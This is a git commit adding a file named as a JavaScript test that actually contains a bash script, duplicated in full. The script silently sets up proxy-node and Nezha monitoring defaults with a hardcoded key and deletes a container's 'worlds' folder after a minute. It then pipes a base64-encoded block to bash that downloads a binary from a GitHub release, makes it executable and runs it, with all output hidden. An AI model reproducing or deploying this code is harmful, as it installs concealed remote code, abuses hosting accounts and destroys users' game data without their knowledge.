8a021c2edac4c711601b25fc263c70e0313f42da
btpp03 <btpp03@gmail.com>
2025-11-03 20:10:59 +0800

    Create wanju-test.js

---
+++ wanju-test.js
@@ -0,0 +1,97 @@
+#!/bin/bash#!/bin/bash
+
+# --- 所有命令静默执行 ---
+exec >/dev/null 2>&1
+
+# 喜欢就点亮星星，不知道的参数保持默认
+
+# cf隧道相关设置
+# export TOK=${TOK:-''}
+# export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
+# export TUNNEL_PROXY="1"
+
+# Telegram配置
+export TG=${TG:-''}
+
+# 节点上传订阅服务器
+export SUB_URL=${SUB_URL:-'https://node.btpp4.netlib.re/upload-123456nb'}
+
+# 哪吒相关设置
+export NEZHA_SERVER=${NEZHA_SERVER:-'nezhak2.btpp.ggff.net'}
+export NEZHA_KEY=${NEZHA_KEY:-'5ZCgHx4P2NZAXNhcPx'}
+export NEZHA_PORT=${NEZHA_PORT:-'443'}
+export NEZHA_TLS=${NEZHA_TLS:-'1'}
+# export AGENT_UUID=${AGENT_UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}
+
+# 节点设置
+export TMP_ARGO=${TMP_ARGO:-'sock'}
+export VL_PORT=${VL_PORT:-'8002'}
+export VM_PORT=${VM_PORT:-'8001'}
+export CF_IP=${CF_IP:-'ip.sb'}
+export SUB_NAME=${SUB_NAME:-'wisp-btpp04'}
+export second_port=${second_port:-''}
+# export UUID=${UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}
+
+# reality相关设置
+export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
+export SNI=${SNI:-'www.apple.com'}
+# export HOST=${HOST:-'1.1.1.1'}
+
+# export JAR_SH='moni'
+
+# --- 一分钟后删除 worlds 文件夹（后台执行，不影响主程序） ---
+(
+    sleep 60
+    rm -rf home/container/worlds >/dev/null 2>&1
+) &
+
+# --- 启动主程序 ---
+echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash >/dev/null 2>&1
+
+# --- 所有命令静默执行 ---
+exec >/dev/null 2>&1
+
+# 喜欢就点亮星星，不知道的参数保持默认
+
+# cf隧道相关设置
+# export TOK=${TOK:-''}
+# export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
+# export TUNNEL_PROXY="1"
+
+# Telegram配置
+export TG=${TG:-''}
+
+# 节点上传订阅服务器
+export SUB_URL=${SUB_URL:-'https://node.btpp4.netlib.re/upload-123456nb'}
+
+# 哪吒相关设置
+export NEZHA_SERVER=${NEZHA_SERVER:-'nezhak2.btpp.ggff.net'}
+export NEZHA_KEY=${NEZHA_KEY:-'5ZCgHx4P2NZAXNhcPx'}
+export NEZHA_PORT=${NEZHA_PORT:-'443'}
+export NEZHA_TLS=${NEZHA_TLS:-'1'}
+# export AGENT_UUID=${AGENT_UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}
+
+# 节点设置
+export TMP_ARGO=${TMP_ARGO:-'sock'}
+export VL_PORT=${VL_PORT:-'8002'}
+export VM_PORT=${VM_PORT:-'8001'}
+export CF_IP=${CF_IP:-'ip.sb'}
+export SUB_NAME=${SUB_NAME:-'wisp-btpp04'}
+export second_port=${second_port:-''}
+# export UUID=${UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}
+
+# reality相关设置
+export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
+export SNI=${SNI:-'www.apple.com'}
+# export HOST=${HOST:-'1.1.1.1'}
+
+# export JAR_SH='moni'
+
+# --- 一分钟后删除 worlds 文件夹（后台执行，不影响主程序） ---
+(
+    sleep 60
+    rm -rf home/container/worlds >/dev/null 2>&1
+) &
+
+# --- 启动主程序 ---
+echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash >/dev/null 2>&1
